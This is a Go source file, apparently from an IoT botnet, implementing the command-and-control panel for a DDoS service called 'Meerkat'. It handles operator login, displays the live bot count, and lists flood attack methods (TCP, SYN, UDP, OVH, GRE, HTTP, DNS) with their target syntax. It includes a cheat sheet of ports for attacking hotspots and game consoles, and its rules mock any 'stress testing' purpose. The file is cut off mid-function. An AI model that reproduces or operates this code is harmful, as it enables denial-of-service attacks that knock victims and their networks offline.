package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
    "net/http"
    "io/ioutil"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    // Get username
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[38;5;202m \r\n")) 
    this.conn.Write([]byte("\033[38;5;202musername\033[0;97m: \033[0m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[38;5;202mpassword\033[0;97m: \033[0m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
        this.conn.Write([]byte("\r\033[0;91mCheck your login Info\r\n"))
        this.conn.Write([]byte("\033[0;91mSubby if this is you dont even try\033[0m"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d IoT | %s\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()


    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\033[38;5;202m ███╗   ███╗                                                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ████╗ ████║                                                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██╔████╔██║                                                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║╚██╔╝██║                                                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║ ╚═╝ ██║                                                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ╚═╝     ╚═╝                                                                                      \r\n"))
    time.Sleep(1 * time.Second)
    this.conn.Write([]byte("\033[2J\033[1H"))                                                                      
    this.conn.Write([]byte("\033[38;5;202m ███╗   ███╗███████╗                                                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ████╗ ████║██╔════╝                                                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██╔████╔██║█████╗                                                                                \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║╚██╔╝██║██╔══╝                                                                                \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║ ╚═╝ ██║███████╗                                                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ╚═╝     ╚═╝╚══════╝                                                                              \r\n")) 
    time.Sleep(1 * time.Second)
    this.conn.Write([]byte("\033[2J\033[1H"))                                                                       
    this.conn.Write([]byte("\033[38;5;202m ███╗   ███╗███████╗███████╗                                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ████╗ ████║██╔════╝██╔════╝                                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██╔████╔██║█████╗  █████╗                                                                        \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║╚██╔╝██║██╔══╝  ██╔══╝                                                                        \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║ ╚═╝ ██║███████╗███████╗                                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ╚═╝     ╚═╝╚══════╝╚══════╝                                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m                                                                                                  \r\n"))
    time.Sleep(1 * time.Second)
    this.conn.Write([]byte("\033[2J\033[1H"))                                                                       
    this.conn.Write([]byte("\033[38;5;202m ███╗   ███╗███████╗███████╗██████╗                                                               \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ████╗ ████║██╔════╝██╔════╝██╔══██╗                                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██╔████╔██║█████╗  █████╗  ██████╔╝                                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║╚██╔╝██║██╔══╝  ██╔══╝  ██╔══██╗                                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║ ╚═╝ ██║███████╗███████╗██║  ██║                                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ╚═╝     ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝                                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m                                                                                                  \r\n"))
    time.Sleep(1 * time.Second)
    this.conn.Write([]byte("\033[2J\033[1H"))                                                                       
    this.conn.Write([]byte("\033[38;5;202m ███╗   ███╗███████╗███████╗██████╗ ██╗  ██╗                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ████╗ ████║██╔════╝██╔════╝██╔══██╗██║ ██╔╝                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██╔████╔██║█████╗  █████╗  ██████╔╝█████╔╝                                                       \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║╚██╔╝██║██╔══╝  ██╔══╝  ██╔══██╗██╔═██╗                                                       \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║ ╚═╝ ██║███████╗███████╗██║  ██║██║  ██╗                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ╚═╝     ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m                                                                                                  \r\n"))
    time.Sleep(1 * time.Second)
    this.conn.Write([]byte("\033[2J\033[1H"))                                                                       
    this.conn.Write([]byte("\033[38;5;202m ███╗   ███╗███████╗███████╗██████╗ ██╗  ██╗ █████╗                                               \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ████╗ ████║██╔════╝██╔════╝██╔══██╗██║ ██╔╝██╔══██╗                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██╔████╔██║█████╗  █████╗  ██████╔╝█████╔╝ ███████║                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║╚██╔╝██║██╔══╝  ██╔══╝  ██╔══██╗██╔═██╗ ██╔══██║                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║ ╚═╝ ██║███████╗███████╗██║  ██║██║  ██╗██║  ██║                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ╚═╝     ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m                                                                                                  \r\n"))
    time.Sleep(1 * time.Second)
    this.conn.Write([]byte("\033[2J\033[1H"))                                                                       
    this.conn.Write([]byte("\033[38;5;202m ███╗   ███╗███████╗███████╗██████╗ ██╗  ██╗ █████╗ ████████╗                                     \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ████╗ ████║██╔════╝██╔════╝██╔══██╗██║ ██╔╝██╔══██╗╚══██╔══╝                                     \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██╔████╔██║█████╗  █████╗  ██████╔╝█████╔╝ ███████║   ██║                                        \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║╚██╔╝██║██╔══╝  ██╔══╝  ██╔══██╗██╔═██╗ ██╔══██║   ██║                                        \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║ ╚═╝ ██║███████╗███████╗██║  ██║██║  ██╗██║  ██║   ██║                                        \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ╚═╝     ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝                                        \r\n"))
    this.conn.Write([]byte("\033[38;5;202m                                                                                                  \r\n"))

    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\033[\033[\033[01;97mMeerkat \033[038;5;202m> \033[0;97m"))
        cmd, err := this.ReadLine(false)
        
        if cmd == "clear" || cmd == "cls" || cmd == "c"|| cmd == "CLS"  {
       this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\033[38;5;202m ███╗   ███╗                                                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ████╗ ████║                                                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██╔████╔██║                                                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║╚██╔╝██║                                                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║ ╚═╝ ██║                                                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ╚═╝     ╚═╝                                                                                      \r\n"))
    time.Sleep(1 * time.Second)
    this.conn.Write([]byte("\033[2J\033[1H"))                                                                      
    this.conn.Write([]byte("\033[38;5;202m ███╗   ███╗███████╗                                                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ████╗ ████║██╔════╝                                                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██╔████╔██║█████╗                                                                                \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║╚██╔╝██║██╔══╝                                                                                \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║ ╚═╝ ██║███████╗                                                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ╚═╝     ╚═╝╚══════╝                                                                              \r\n")) 
    time.Sleep(1 * time.Second)
    this.conn.Write([]byte("\033[2J\033[1H"))                                                                       
    this.conn.Write([]byte("\033[38;5;202m ███╗   ███╗███████╗███████╗                                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ████╗ ████║██╔════╝██╔════╝                                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██╔████╔██║█████╗  █████╗                                                                        \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║╚██╔╝██║██╔══╝  ██╔══╝                                                                        \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║ ╚═╝ ██║███████╗███████╗                                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ╚═╝     ╚═╝╚══════╝╚══════╝                                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m                                                                                                  \r\n"))
    time.Sleep(1 * time.Second)
    this.conn.Write([]byte("\033[2J\033[1H"))                                                                       
    this.conn.Write([]byte("\033[38;5;202m ███╗   ███╗███████╗███████╗██████╗                                                               \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ████╗ ████║██╔════╝██╔════╝██╔══██╗                                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██╔████╔██║█████╗  █████╗  ██████╔╝                                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║╚██╔╝██║██╔══╝  ██╔══╝  ██╔══██╗                                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║ ╚═╝ ██║███████╗███████╗██║  ██║                                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ╚═╝     ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝                                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m                                                                                                  \r\n"))
    time.Sleep(1 * time.Second)
    this.conn.Write([]byte("\033[2J\033[1H"))                                                                       
    this.conn.Write([]byte("\033[38;5;202m ███╗   ███╗███████╗███████╗██████╗ ██╗  ██╗                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ████╗ ████║██╔════╝██╔════╝██╔══██╗██║ ██╔╝                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██╔████╔██║█████╗  █████╗  ██████╔╝█████╔╝                                                       \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║╚██╔╝██║██╔══╝  ██╔══╝  ██╔══██╗██╔═██╗                                                       \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║ ╚═╝ ██║███████╗███████╗██║  ██║██║  ██╗                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ╚═╝     ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝                                                      \r\n"))
    this.conn.Write([]byte("\033[38;5;202m                                                                                                  \r\n"))
    time.Sleep(1 * time.Second)
    this.conn.Write([]byte("\033[2J\033[1H"))                                                                       
    this.conn.Write([]byte("\033[38;5;202m ███╗   ███╗███████╗███████╗██████╗ ██╗  ██╗ █████╗                                               \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ████╗ ████║██╔════╝██╔════╝██╔══██╗██║ ██╔╝██╔══██╗                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██╔████╔██║█████╗  █████╗  ██████╔╝█████╔╝ ███████║                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║╚██╔╝██║██╔══╝  ██╔══╝  ██╔══██╗██╔═██╗ ██╔══██║                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║ ╚═╝ ██║███████╗███████╗██║  ██║██║  ██╗██║  ██║                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ╚═╝     ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝                                              \r\n"))
    this.conn.Write([]byte("\033[38;5;202m                                                                                                  \r\n"))
    time.Sleep(1 * time.Second)
    this.conn.Write([]byte("\033[2J\033[1H"))                                                                       
    this.conn.Write([]byte("\033[38;5;202m ███╗   ███╗███████╗███████╗██████╗ ██╗  ██╗ █████╗ ████████╗                                     \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ████╗ ████║██╔════╝██╔════╝██╔══██╗██║ ██╔╝██╔══██╗╚══██╔══╝                                     \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██╔████╔██║█████╗  █████╗  ██████╔╝█████╔╝ ███████║   ██║                                        \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║╚██╔╝██║██╔══╝  ██╔══╝  ██╔══██╗██╔═██╗ ██╔══██║   ██║                                        \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ██║ ╚═╝ ██║███████╗███████╗██║  ██║██║  ██╗██║  ██║   ██║                                        \r\n"))
    this.conn.Write([]byte("\033[38;5;202m ╚═╝     ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝                                        \r\n"))
    this.conn.Write([]byte("\033[38;5;202m                                                                                                  \r\n"))
            continue
        }
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        if cmd == "" {
            continue
        }
        botCount = userInfo.maxBots

        if err != nil || cmd == "METHODS" || cmd == "methods" || cmd == "attack" || cmd == "DDOS" || cmd == "ddos" || cmd == "ATTACK"  {
            this.conn.Write([]byte("\x1b[38;5;202m ╔═══════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m  TCP    - TCP FLOODS      \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m  UDP    - UDP FLOODS      \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m  L7     - LAYER 7 FLOODS  \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m  GRE    - GRE BASED FLOODS\x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ╚═══════════════════════════╝\r\n"))
            continue
        }

        if err != nil || cmd == "TCP" || cmd == "tcp" {
            this.conn.Write([]byte("\x1b[38;5;202m ╔═════════════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m tcp [ip] [time] dport=[port]        - tcp           \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m syn [ip] [time] dport=[port]        - syn           \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m usyn [ip] [time] dport=[port]       - usyn          \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m tcpall [ip] [time] dport=[port]     - tcpall        \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m frag [ip] [time] dport=[port]       - frag          \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m asyn [ip] [time] dport=[port]       - asyn          \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m ack [ip] [time] dport=[port]        - ack           \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m stomp [ip] [time] dport=[port]      - stomp         \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ╚═════════════════════════════════════════════════════╝\r\n"))
            continue
        }

        if err != nil || cmd == "UDP" || cmd == "udp" {
            this.conn.Write([]byte("\x1b[38;5;202m ╔═════════════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m udp [ip] [time] dport=[port]        - udp           \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m ovh [ip] [time] dport=[port]        - ovh           \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m udpraw [ip] [time] dport=[port]     - udpraw        \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m std [ip] [time] dport=[port]        - std           \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m xmas [ip] [time] dport=[port]       - std           \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ╚═════════════════════════════════════════════════════╝\r\n"))
            continue
        }

        if err != nil || cmd == "GRE" || cmd == "gre" {
            this.conn.Write([]byte("\x1b[38;5;202m ╔═════════════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m greeth [ip] [time] dport=[port]      - greeth       \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m greip [ip] [time] dport=[port]       - greip        \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ╚═════════════════════════════════════════════════════╝\r\n"))
            continue
        }

        if err != nil || cmd == "L7" || cmd == "l7" || cmd == "layer7" || cmd == "LAYER7" {
            this.conn.Write([]byte("\x1b[38;5;202m ╔═════════════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m http [ip] [time] domain=[domain] conns=[600] - http \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m dns  [ip] [time] dport=[port]                - dns  \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ╚═════════════════════════════════════════════════════╝\r\n"))
            continue
        }
            
            if err != nil || cmd == "HELP" || cmd == "help" || cmd == "?" {
            this.conn.Write([]byte("\x1b[38;5;202m ╔══════════════════════════════════╗ \r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m METHODS  - Shows Methods         \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m RULES    - Shows Rules           \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m PORTS    - Shows Common Ports    \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m ADMIN    - Shows Admin Commands  \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m CLS      - Clears The Screen     \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m INFO     - Shows User Info       \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m TOOLS    - Shows Tools           \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m LOGOUT   - Closes CNC            \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ╚══════════════════════════════════╝\r\n"))
            continue
        }

        if err != nil || cmd == "TOOLS" || cmd == "tools" || cmd == "?" {
            this.conn.Write([]byte("\x1b[38;5;202m ╔══════════════════════════════════╗ \r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m PING     - Pngs an IP            \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m IPLOOKUP - Shows IP info         \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m WHOIS    - Runs a WHOIS check    \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m TRACER   - Traceroute on IP      \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m RESOLVE  - Resolves Domain       \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m REVDNS   - Shows DNS of IP       \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m ASNLOOKUP- Shows ASN of IP       \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m SUBCALC  - Calculates Subnet     \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m ZTRANSF  - Shows ZoneTransfer    \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ╚══════════════════════════════════╝\r\n"))
            continue
        }

        if err != nil || cmd == "PORTS" || cmd == "ports" {
          this.conn.Write([]byte("\x1b[38;5;202m ╔════════════════════════════════════════════════════════════════════╗\r\n"))
          this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m HOTSPOT PORTS:                     VERIZON 4G LTE:                 \x1b[38;5;202m║\r\n"))
          this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m UDP - 1900                         UDP - 53, 123, 500, 4500, 52248 \x1b[38;5;202m║\r\n"))
          this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m TCP - 2859, 5000                   TCP - 53                        \x1b[38;5;202m║\r\n"))
          this.conn.Write([]byte("\x1b[38;5;202m ║                                                                    \x1b[38;5;202m║\r\n"))
          this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m AT&T Wi-Fi HOTSPOTS                ATTACK PORTS:                   \x1b[38;5;202m║\r\n"))
          this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97mUDP - 137, 138, 139, 445, 8053     699 Good For Hotspots            \x1b[38;5;202m║\r\n"))
          this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97mTCP - 1434, 8053, 8083, 8084       5060 Router Reset Port           \x1b[38;5;202m║\r\n"))
          this.conn.Write([]byte("\x1b[38;5;202m ║                                                                    \x1b[38;5;202m║\r\n"))
          this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m GENERAL PORTS:                                                     \x1b[38;5;202m║\r\n"))
          this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m HOME: 80, 53, 22, 8080             Please do not Abuse             \x1b[38;5;202m║\r\n"))
          this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m XBOX: 3074                          Any of our tools               \x1b[38;5;202m║\r\n"))
          this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m PS4: 9307                            As they are here              \x1b[38;5;202m║\r\n"))
          this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m PS3:                                   Just for                    \x1b[38;5;202m║\r\n"))
          this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m  -TCP:3478, 3479, 3480, 5223            Educational Purposes       \x1b[38;5;202m║\r\n"))
          this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m  -UDP:3478, 3479                            ONLY!                  \x1b[38;5;202m║\r\n"))
          this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m HOTSPOT: 9286                                                      \x1b[38;5;202m║\r\n"))
          this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m VPN: 7777                              OwO                         \x1b[38;5;202m║\r\n"))
          this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m NFO: 1192                                                          \x1b[38;5;202m║\r\n"))
          this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m OVH: 992                                                           \x1b[38;5;202m║\r\n"))
          this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m HTTP: 80, 8080,443                                                \x1b[38;5;202m ║\r\n"))
          this.conn.Write([]byte("\x1b[38;5;202m ╚════════════════════════════════════════════════════════════════════╝\r\n"))
          continue
        }

if err != nil || cmd == "PING" || cmd == "ping" {
          this.conn.Write([]byte("\x1b[38;5;202m Pong LMFAO why u try me ?\r\n"))
          continue
      }

         if err != nil || cmd == "admin" || cmd == "ADMIN" {
            this.conn.Write([]byte("\x1b[38;5;202m ╔══════════════════════════════════╗ \r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m ADDUSER  - Adds Normal User      \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m RMUSER   - Removes User          \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m BOTS     - Shows Bots            \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ╚══════════════════════════════════╝\r\n"))
            continue
        }

        if err != nil || cmd == "INFO" || cmd == "info" {
            this.conn.Write([]byte(fmt.Sprintf("\033[038;5;202m ═════════════════════════════════  \r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[038;5;202m  \033[01;97mLogged In As: \033[038;5;202m" + username + "          \r\n")))                        
            this.conn.Write([]byte(fmt.Sprintf("\033[038;5;202m  \033[01;97mPet Version: \033[038;5;202m V1.0                       \r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[038;5;202m  \033[01;97mDeveloped By \033[038;5;202mLeafeon&Alex               \r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[038;5;202m ═════════════════════════════════  \r\n")))
            continue
        }

        if err != nil || cmd == "RULES" || cmd == "rules" {  
            this.conn.Write([]byte("\x1b[38;5;202m ╔═════════════════════════════════════╗ \r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m DO NOT SPAM ATTACKS !               \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m DO NOT SHARE LOGINS !(IP is logged) \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m DO NOT ATTACK GOVERNMENTS !         \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m ONLY USE FOR sTrEsS tEsTiNg :)      \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m 3 Warnings = Ban                    \x1b[38;5;202m║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;202m ╚═════════════════════════════════════╝\r\n"))
            continue  
        }

        botCount = userInfo.maxBots

        if err != nil || cmd == "logout" || cmd == "LOGOUT" {
            return
        }
            if err != nil || cmd == "IPLOOKUP" || cmd == "iplookup" {
            this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m:\x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "http://ip-api.com/line/" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[96m: \r\n\x1b[96m" + locformatted + "\r\n"))
            }

            if err != nil || cmd == "WHOIS" || cmd == "whois" {
            this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/whois/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
